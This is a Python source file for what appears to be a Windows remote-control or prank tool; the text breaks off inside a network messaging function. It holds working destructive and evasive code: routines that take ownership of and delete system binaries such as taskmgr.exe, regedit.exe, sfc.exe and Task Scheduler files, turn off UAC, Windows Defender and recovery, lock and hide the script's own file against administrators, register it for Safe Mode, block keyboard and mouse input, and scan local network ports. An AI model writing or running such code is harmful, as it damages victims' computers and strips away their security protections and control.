import time
import ctypes
import sys
import os
import subprocess
import pyautogui
import requests
import asyncio
import socket
import numpy as np
from PIL import Image, ImageDraw, ImageTk
import io
import cv2
import traceback
import select
import zlib 
import zipfile
import threading
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from selenium import webdriver
import random
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import selenium.common.exceptions
import math
from bs4 import BeautifulSoup
import re
import win32com
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import xml.etree.ElementTree as ET
import keyboard
import string
import wget
from pyshortcuts import make_shortcut
import winreg
from PIL import Image, ImageChops
import urllib.request
from ctypes import *
import win32gui
from mark1_translate import translate as translator
from pynput import keyboard as pynput_keyboard
import win32process
import imutils
import json
import concurrent.futures
import base64
from concurrent.futures import ThreadPoolExecutor
import urllib
try:
    import scapy.all
except Exception as e:
    print(f'Error: {e}')

import pyttsx3
import winsound
import pynput
import wave
import pyaudio
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import multiprocessing
import signal
import pygame
import shlex
import pyautogui as pt
import sounddevice as sd
import comtypes
from Crypto.Cipher import AES
from Crypto.Util import number
import win32api
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import re
import psutil
from tcp_latency import measure_latency
import rotatescreen
# from random import *
import ast
from pynput.keyboard import Key, Listener
import win32con
import logging
from datetime import datetime
from gtts import gTTS
import playsound
from pytube import YouTube
import pythoncom, pyWinhook
import win32comext.shell.shell as shell
from langdetect import detect, DetectorFactory
import trace
from random import randint
from PyQt5.QtWidgets import QApplication, QLabel, QVBoxLayout, QWidget, QPushButton, QSizePolicy, QCheckBox
from PyQt5.QtGui import QPixmap, QImage
from PyQt5.QtCore import QThread, pyqtSignal, Qt
import PyQt5.QtCore as QtCore
from PyQt5.QtGui import QKeySequence
import struct
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import gevent
from random import choice as choice_list
from flask import Flask, render_template
from flask_socketio import SocketIO
import requests
import geocoder
from geopy.geocoders import Nominatim
from geopy.geocoders import Photon
from engineio.async_drivers import gevent
from flask import Flask, jsonify, render_template
from flask import Flask, render_template, request, Response
from PIL import Image
from flask import url_for
from flask import *
from flask import Flask, request, jsonify

from longvariables import system32_files, windows_files

# --- Global Variables ---
startup_START = time.time()
admin_privileges = not (ctypes.windll.shell32.IsUserAnAdmin() == 0)
mouse_idle = 0  
keyboard_idle = 0  
script_start = time.time()
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0
socket.setdefaulttimeout(None)
autoterminateunknownexeprocesses = False
autofreezeunknownprocesses = False 
SelfUserUsername = os.environ['username']
SelfComputerName = os.environ['COMPUTERNAME'] 
prioritizeipv4 = None
INTERNET = False  
last_successful_check = 0
CHECK_INTERVAL = 1  
TIMEOUT_THRESHOLD = 5 
HEADER = 64
vary_PORT = 45433 
server = None
done_vary_tasks = []
computersusername = os.environ['username']
varyhosts = []  
timeout_device_list = {}  
connected_devices = [] 
device_search = []  
device_item_received = {} 
screen_width = win32api.GetSystemMetrics(0)
screen_height = win32api.GetSystemMetrics(1)
mouse_listener = pynput.mouse.Listener(suppress=True)
hm = None
# disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun) # Moved to a different place due to function and class not being defined
running_ss = False
COMMAND_DELIMITER = ";;" 
SmartAssNoInternet_isenabled = True
killablethread_thread = None
timeoutfordvd = 0
last_keyboard_input_time = time.time()
last_mouse_input_time = time.time()
# dvd_runthread = KThread(target=startdvdanim) # Moved to a different place due to function and class not being defined
stop_event_windowslag = threading.Event()
stop_event_windowslag.set() 

# --- Utility Functions ---

def slp(seconds):
    """Sleeps without using time.sleep(), preventing thread blocking.

    Args:
        seconds (int): The number of seconds to wait.
    """
    
    toWait = time.time() + seconds
    while time.time() < toWait:
        pass


def runfunctionvianame(name, *args, **kwargs):
    """Runs a function by its name from the current module.

    Args:
        name (str): The name of the function to run.
        *args: Variable length argument list for the function.
        **kwargs: Arbitrary keyword arguments for the function.

    Returns:
        None
    """
    try:
        func = getattr(sys.modules[__name__], name)
        if func:
            func(*args, **kwargs)
        else:
            print(f"No function named {name} found.")
    except Exception as e:
        print(f"Error running function {name}: {e}")

def installchrome():
    """Downloads and installs the latest version of Google Chrome."""
    url = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
    filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + '.exe'
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    filename_dir = os.path.join(download_dir, filename)

    with requests.get(url, stream=True) as response:
        response.raise_for_status()
        with open(filename_dir, "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                f.write(chunk)
    
    slp(2)
    programVL2(filename_dir + ' /install')

def download_and_run_desktop_goose():
    """Downloads, unzips, and runs Desktop Goose."""
    url = "static dl link didn't work, dropbox perhaps? nan, don't - cannot upload such a thing to github"
    zip_filename = "Desktop Goose v0.31.zip"
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    zip_path = os.path.join(download_dir, zip_filename)
    
    # Bad downloading as of now, need to fix it
    # I also need to find a fixed download url.
    
    
    # Download the file
    print("Downloading Desktop Goose...")
    response = requests.get(url)
    with open(zip_path, 'wb') as file:
        file.write(response.content)
    
    # Unzip the file
    print("Unzipping the file...")
    extract_dir = os.path.join(download_dir, "Desktop Goose v0.31")
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_dir)
    
    # Construct path to the executable
    goose_path = os.path.join(extract_dir, "Desktop Goose v0.31", "DesktopGoose v0.31", "GooseDesktop.exe")
    
    # Run the executable
    print("Running Desktop Goose...")
    subprocess.Popen(goose_path)


def kill_desktop_goose():
    """Terminates the Desktop Goose process."""
    print("Attempting to terminate Desktop Goose...")
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == 'GooseDesktop.exe':
            proc.terminate()
            print("Desktop Goose terminated.")
            return
    print("Desktop Goose process not found.")

def cleanup_desktop_goose():
    """Removes the downloaded and extracted Desktop Goose files."""
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    zip_path = os.path.join(download_dir, "Desktop Goose v0.31.zip")
    extract_dir = os.path.join(download_dir, "Desktop Goose v0.31")
    
    print("Cleaning up Desktop Goose files...")
    
    # Remove zip file
    if os.path.exists(zip_path):
        os.remove(zip_path)
        print("Zip file removed.")
    
    # Remove extracted directory
    if os.path.exists(extract_dir):
        os.remove(extract_dir)
        print("Extracted files removed.")
    
    print("Cleanup completed.")

def disablekeyboard_threadtorun():
    """Disables keyboard input by setting a low-level keyboard hook."""
    global hm
    hm = pyWinhook.HookManager()
    hm.KeyAll = lambda event: False
    hm.HookKeyboard()
    pythoncom.PumpMessages()


def disable_keyboard():
    """Starts a thread to disable keyboard input."""
    global disablekeyboard_threadtorun_thread
    if not disablekeyboard_threadtorun_thread.is_alive():
        disablekeyboard_threadtorun_thread.start()

def enable_keyboard():
    """Stops the thread that disables keyboard input."""
    global hm, disablekeyboard_threadtorun_thread
    if disablekeyboard_threadtorun_thread.is_alive():
        disablekeyboard_threadtorun_thread.kill()
        hm.UnhookKeyboard()
        disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun)

def disable_mouse():
    """Starts the mouse listener to disable mouse input."""
    global mouse_listener
    if not mouse_listener.is_alive():
        mouse_listener.start()

def enable_mouse():
    """Stops the mouse listener and creates a new one."""
    global mouse_listener
    if mouse_listener.is_alive():
        mouse_listener.stop()
        mouse_listener = pynput.mouse.Listener(suppress=True)

def presskeys(inputGiven):
    """Presses and releases the specified keys.

    Args:
        inputGiven (str): The keys to press, e.g., "ctrl+c".
    """
    try:
        keyboard.press_and_release(inputGiven)
    except Exception as e:
        print(f'Error pressing keys: {e}')


def writetext(text):
    """Types the specified text using the keyboard.

    Args:
        text (str): The text to type.
    """
    keyboard.write(text)

def MeAndTheBoys():
    """Plays a random YouTube video from a predefined list."""
    videos = [
        'https://www.youtube.com/watch?v=DMBU88iR-wg', 
        'https://www.youtube.com/watch?v=W-Repa-xAxA', 
        'https://www.youtube.com/watch?v=_zaQgzOREHA', 
        'https://www.youtube.com/watch?v=6G4OlCbTpec'
    ]
    random_video = random.choice(videos)
    webhandler(random_video)

def corrupt_taskscheduler():
    """Corrupts the Windows Task Scheduler by deleting essential files."""
    programVL2('takeown /f C:\\Windows\\System32\\taskschd.dll')
    programVL2('icacls "C:\\Windows\\System32\\taskschd.dll" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im taskschd.dll')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\taskschd.dll"')
    
    programVL2('takeown /f C:\\Windows\\System32\\taskschd.msc')
    programVL2('icacls "C:\\Windows\\System32\\taskschd.msc" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im taskschd.msc')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\taskschd.msc"')
    
    programVL2('takeown /f C:\\Windows\\System32\\TaskSchdPS.dll')
    programVL2('icacls "C:\\Windows\\System32\\TaskSchdPS.dll" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im TaskSchdPS.dll')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\TaskSchdPS.dll"')

    programVL2('takeown /f C:\\Windows\\System32\\schtasks.exe')
    programVL2('icacls "C:\\Windows\\System32\\schtasks.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im schtasks.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\schtasks.exe"')

def corrupttaskmgr():
    """Corrupts the Windows Task Manager by deleting the executable."""
    programVL2('takeown /f taskmgr.exe')
    programVL2('icacls "C:\\Windows\\system32\\taskmgr.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im taskmgr.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\system32\\taskmgr.exe"')

def corruptmmc():
    """Corrupts the Windows Management Console by deleting the executable."""
    programVL2('takeown /f "C:\\Windows\\system32\\mmc.exe"')
    programVL2('icacls "C:\\Windows\\system32\\mmc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im mmc.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\system32\\mmc.exe"')

def corruptregedit():
    """Corrupts the Windows Registry Editor by deleting the executable."""
    programVL2('takeown /f "C:\\Windows\\regedit.exe"')
    programVL2('icacls "C:\\Windows\\regedit.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im regedit.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\regedit.exe"')

def corruptdllhost():
    """Corrupts the Windows DLL Host by deleting the executable."""
    programVL2('takeown /f "C:\\Windows\\dllhost.exe"')
    programVL2('icacls "C:\\Windows\\dllhost.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im dllhost.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\dllhost.exe"')

def corruptsfc():
    """Corrupts the Windows System File Checker by deleting the executable."""
    programVL2('takeown /f "C:\\Windows\\System32\\sfc.exe"')
    programVL2('icacls "C:\\Windows\\System32\\sfc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im sfc.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\sfc.exe"')

def corruptsystemreset():
    """Corrupts the Windows System Reset by deleting the executable."""
    programVL2('takeown /f "C:\\Windows\\System32\\systemreset.exe"')
    programVL2('icacls "C:\\Windows\\System32\\systemreset.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im systemreset.exe')
    slp(0.5)
    programVL2('del "C:\\Windows\\System32\\systemreset.exe"')


def runcmd(cmd, suppress=False, retry=0):
    """Runs a command in the shell.

    Args:
        cmd (str): The command to run.
        suppress (bool): Whether to suppress output. Defaults to False.
        retry (int): Number of retries. Defaults to 0.

    Returns:
        None
    """
    try:
        a = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        a.wait()
        if a.returncode == 0:
            if not suppress:
                print("The command ran successfully", "@ command :", cmd)
        else:
            if not suppress:
                print("The command failed with return code", a.returncode, "@ command :", cmd)
            if retry > 4:
                return
            retry += 1
            runcmd(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at runcmd, {e}')

def programVL2(cmd, suppress=False, retry=0):
    """Runs a command with administrator privileges.

    Args:
        cmd (str): The command to run.
        suppress (bool): Whether to suppress output. Defaults to False.
        retry (int): Number of retries. Defaults to 0.

    Returns:
        None
    """
    try:
        a = shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+cmd)
        if a['hInstApp'] > 32:
            if not suppress:
                print("The admin command ran successfully", "@ command :", cmd)
        else:
            if not suppress:
                print("The admin command failed with an error code", ctypes.WinError(), "@ command :", cmd)
            if retry > 4:
                return
            retry += 1
            return programVL2(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at programVL2, {e}, CMD:{cmd}')
        if 'The operation was canceled by the user.' in e.args:
            retry +=1
            return programVL2(cmd, suppress, retry)

def screenoff():
    """Turns off the screen."""
    win32api.SendMessage(0xFFFF, 0x0112, 0xF170, 2) 

def blackenscreen(durationinSeconds):
    """Turns the screen black for a specified duration.

    Args:
        durationinSeconds (int): The duration in seconds.
    """
    try:
        t_end = time.time() + int(durationinSeconds)
        while time.time() < t_end:
            threading.Thread(target=screenoff).start()
            slp(0.2)
    except Exception as e:
        print(f'Error in blackenscreen, {e}')

def texttospeech(text):
    """Speaks the given text using text-to-speech."""
    pythoncom.CoInitialize()
    pyttsx3.init(driverName='sapi5')
    engine = pyttsx3.init()
    engine.setProperty('rate', 165)
    engine.setProperty('volume', 10)
    engine.say(f'<pitch middle="-15">{text}</pitch>')
    engine.runAndWait()
    pythoncom.CoInitialize()

def transalte(translatetext, toLang):
    """Translates the given text to the specified language.

    Args:
        translatetext (str): The text to translate.
        toLang (str): The target language code (e.g., 'ru', 'fr').

    Returns:
        str: The translated text.
    """
    translator_obj = translator(translatetext, dest=toLang, src='auto')
    translated_text = translator_obj.text
    return translated_text

def speak(text, lang):
    """Speaks the given text in the specified language using gTTS.

    Args:
        text (str): The text to speak.
        lang (str): The language code (e.g., 'en', 'ru').
    """
    try:
        filename = f"tmp{randint(0, 1024123)}files.mp3"
        filepath = get_script_directory() + '\\' + filename
        tts = gTTS(text=text, lang=lang)
        tts.save(filepath)
        pygame.mixer.init()
        pygame.mixer.music.load(filepath)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            pygame.time.Clock().tick(10)
        pygame.mixer.music.unload()
        os.remove(filepath)
    except Exception as e:
        print(f'Caught exception:\n{e}')

def mapLangDetect_gtts(lang):
    lang_mapping = {
        # note languages that are not supported are defaulted to en.
        'af': 'af',
        'ar': 'ar',
        'bg': 'bg',
        'bn': 'bn',
        'ca': 'ca',
        'cs': 'cs',
        'cy': 'en',  
        'da': 'da',
        'de': 'de',
        'el': 'el',
        'en': 'en',
        'es': 'es',
        'et': 'et',
        'fa': 'fa',
        'fi': 'fi',
        'fr': 'fr',
        'gu': 'gu',
        'he': 'iw', 
        'hi': 'hi',
        'hr': 'hr',
        'hu': 'hu',
        'id': 'id',
        'it': 'it',
        'ja': 'ja',
        'kn': 'kn',
        'ko': 'ko',
        'lt': 'lt',
        'lv': 'lv',
        'mk': 'mk',  
        'ml': 'ml',
        'mr': 'mr',
        'ne': 'ne',
        'nl': 'nl',
        'no': 'no',
        'pa': 'en', 
        'pl': 'pl',
        'pt': 'pt',
        'ro': 'ro',
        'ru': 'ru',
        'sk': 'sk',
        'sl': 'en',  
        'so': 'en',  
        'sq': 'sq',
        'sv': 'sv',
        'sw': 'sw',
        'ta': 'ta',
        'te': 'te',
        'th': 'th',
        'tl': 'tl',
        'tr': 'tr',
        'uk': 'uk',
        'ur': 'ur',
        'vi': 'vi',
        'zh-cn': 'zh-CN',
        'zh-tw': 'zh-TW'
    }
    return lang_mapping.get(lang, 'en')

def detectLang(text):
    """Detects the language of the given text.

    Args:
        text (str): The text to analyze.

    Returns:
        str: The language code (e.g., 'en', 'ru').
    """
    try:
        return mapLangDetect_gtts(detect(str(text)))
    except Exception as e:
        print(e)

def speakXlanguage(text):
    """Detects the language of the text and speaks it accordingly."""
    speak(text, detectLang(text))

def disableUserAccountControl():
    """Disables User Account Control (UAC) in Windows."""
    programVL2('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')      

def enableUserAccountControl():
    """Enables User Account Control (UAC) in Windows."""
    programVL2('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f')      



def check_internet():
    global INTERNET, last_successful_check
    sites_to_check = [
        "https://www.google.com",
        "https://www.cloudflare.com",
        "https://www.amazon.com"
    ]
    
    for site in sites_to_check:
        try:
            response = requests.get(site, timeout=2)
            if response.status_code == 200:
                INTERNET = True
                last_successful_check = time.time()
                # print(f'Internet connection detected (connected to {site})')
                return
        except requests.RequestException:
            continue
    
    # If we've reached this point, all checks failed
    if time.time() - last_successful_check > TIMEOUT_THRESHOLD:
        INTERNET = False
        print("Internet connection lost")

def internet_check_loop():
    while True:
        check_internet()
        time.sleep(CHECK_INTERVAL)


def start_internet_check():
    threading.Thread(target=internet_check_loop, daemon=True).start()

start_internet_check()

class KThread(threading.Thread):
    """A subclass of threading.Thread that can be killed."""
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Starts the thread."""
        self.__run_backup = self.run
        self.run = self.__run            
        threading.Thread.start(self)

    def __run(self):
        """Installs a trace for killing the thread."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        """Sets the killed flag to True."""
        self.killed = True

disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun) # Needs to be here due to definition errors

def add_to_list_if_not_in(item, lst: list):
    """Adds an item to a list if it's not already present."""
    if item not in lst:
        lst.append(item) 

def search_for_local_devices_port(port: int):
    """Scans the local network for devices listening on the specified port.

    Args:
        port (int): The port to scan.

    Returns:
        list: A list of IP addresses and ports of devices found.
    """
    devices = []

    def scan_ip(ip: str):
        """Scans a single IP address for the specified port."""
        if ip == server:
            return
        socket.setdefaulttimeout(0.7)
        result = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, port))
        if result == 0:
            devices.append(f'{ip}:{port}')

    def get_subnet() -> str:
        """Gets the subnet mask of the current network."""
        ip_address = SERVER
        if ip_address != '127.0.0.1':
            octets = ip_address.split('.')
            last_octet = int(octets[-1])
            return '.'.join(octets[:3]) + '.', last_octet
        return ''

    subnet, last_octet = get_subnet()
    if not subnet:
        print("Couldn't get the subnet for the given interface")
        return []

    threads = []
    for j in range(1, 255):
        if j == last_octet:
            continue 
        thread = threading.Thread(target=scan_ip, args=[f"{subnet}{j}"])
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"Devices found for port {port} are:", devices)
    return devices

def scan_ports(ip_to_scan):
    """Scans a range of ports on a given IP address.

    Args:
        ip_to_scan (str): The IP address to scan.

    Returns:
        list: A list of open ports.
    """
    devices = []    

    def port(port_name):
        """Scans a single port on the given IP address."""
        socket.setdefaulttimeout(0.7)
        result = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip_to_scan, port_name))
        if result == 0:
            print(f'The port {port_name} is successful for ip {ip_to_scan}')
            devices.append(f'{ip_to_scan}:{port_name}')

    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executorofscanip:
        for i in range(1,255):
            executorofscanip.submit(port, i)
            
    print(devices, f"for {ip_to_scan}")
    return devices

def addToSafeModeLocationFile(Location):
    """Adds the script's location to the Safe Mode registry keys."""
    programVL2(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal" /v "robocopy.exe" /t REG_SZ /d "{Location}" /f')
    programVL2(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot" /v "robocopy.exe" /t REG_SZ /d "{Location}" /f')
    programVL2(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network" /v "robocopy.exe" /t REG_SZ /d "{Location}" /f')

def addselftosafemode():
    """Adds the script to run in Safe Mode."""
    addToSafeModeLocationFile(os.path.join(get_script_directory(), get_script_filename()))

def protect_file(file_path):
    """Protects a file by setting permissions and attributes.

    Args:
        file_path (str): The path to the file to protect.
    """
    programVL2(f'icacls "{file_path}" /inheritance:r /grant:r {os.environ["username"]}:F /deny "*":RX')
    programVL2(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    programVL2(f'icacls "{file_path}" /deny {os.getlogin()}:W,D')
    programVL2(f'attrib +r +h +s "{file_path}"')
    programVL2(f'attrib +r "{file_path}"')
    programVL2(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    programVL2(f'icacls "{file_path}" /disable')

def protectfileself():
    """Protects the script file itself."""
    protect_file(os.path.join(get_script_directory(), get_script_filename()))

def DisableWindowsDefender():
    """Disables various components of Windows Defender."""
    try: 
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        programVL2('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v ForceUpdateFromMU /t REG_DWORD /d 0 /f')
        programVL2('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f')
    except Exception as e: 
        print(e)
        return False
    
def EnableWindowsDefender():
    """Enables various components of Windows Defender."""
    try: 
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
    except Exception as e: 
        print(e)
        return False

def disableresetoptions():
    """Disables various system reset options in Windows."""
    programVL2('reagentc.exe /disable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 1 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled no')
    programVL2(r'bcdedit /set {default} bootmenupolicy legacy')
    programVL2('takeown /f ReAgentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\ReAgentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im ReAgentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\ReAgentc.exe" tmpreagentc.exe')
    
def enableresetoptions():
    """Enables various system reset options in Windows."""
    programVL2('reagentc.exe /enable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 0 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled yes')
    programVL2('takeown /f tmpreagentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\tmpreagentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im tmpreagentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\tmpreagentc.exe" ReAgentc.exe')

def handle_tostart_sequences():
    """Handles startup routines, such as adding the script to startup."""
    self_tostartup()


def play_tone_fxphone(information):
    """Plays a tone based on the given information string."""
    information = information.lower()
    frequency, duration = information.split('o1wgi0ks52i40l3')
    play_tone(int(frequency), int(duration))

def insend(serverip, msg):
    """Sends an encrypted message to a specified server IP address.

    Args:
        serverip (str): The IP address of the server.
        msg (str): The message to send.
    """
    toConnect = None
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(3)
        if isinstance(serverip, tuple):
            toConnect = serverip
        elif ":" in serverip:
            server2, port = serverip.split(':')
            toConnect = (server2, int(port))
        else:
            server2 = serverip
            port = 45433
            toConnect = (server2, int(port))
        client.connect(toConnect)

        TUTKEYPHONE = b'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'

        def encrypt(key, plaintext):
            """Encrypts the plaintext using AES."""
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)

        def decrypt(key, ciphertext):
            """Decrypts the ciphertext using AES."""
            (nonce, tag, ciphertext) = ciphertext
